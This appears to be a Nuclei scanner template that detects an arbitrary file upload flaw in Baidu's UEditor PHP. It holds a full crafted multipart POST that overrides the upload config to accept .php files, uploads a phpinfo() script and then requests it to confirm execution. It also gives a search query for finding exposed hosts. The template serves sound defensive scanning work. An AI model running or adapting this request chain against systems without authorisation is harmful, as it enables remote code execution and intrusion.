http:
- extractors:
  - name: vuln_path
    regex:
    - /ueditor/php/upload/{{filename}}\.php
    type: regex
  - group: 1
    part: body
    regex:
    - '>PHP Version <\/td><td class="v">([0-9.]+)'
    type: regex
  matchers:
  - condition: and
    part: body_2
    type: word
    words:
    - PHP Extension
    - PHP Version
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/{{filename}}&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]={{filename}}
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA


    ------WebKitFormBoundaryDMmqvK6b3ncX4xxA

    Content-Disposition: form-data; name="{{filename}}"; filename="{{filename}}.php"

    Content-Type: application/octet-stream


    <?php

    phpinfo();

    ?>

    ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--

    '
  - 'GET /php/upload/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: ueditor-arbitrary-file-upload
info:
  author: ChiragArtani
  classification:
    cpe: cpe:2.3:a:baidu:ueditor:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-434
  description: 'Detects arbitrary file upload vulnerability in UEditor PHP  by attempting
    to upload and execute a PHP file. This vulnerability allows remote attackers to
    upload arbitrary files including PHP files, potentially leading to remote code
    execution.

    '
  metadata:
    fofa-query: body="ueditor"
    max-request: 2
    product: ueditor
    vendor: baidu
  name: UEditor - PHP Arbitrary File Upload
  reference:
  - https://www.rescuetime.com/focus/url/https%3A%2F%2Fwww.cnblogs.com%2Fzhibing%2Fp%2F16893839.html%23_4
  severity: medium
  tags: ueditor,file-upload,rce,intrusive,vuln
variables:
  filename: '{{rand_base(5)}}'
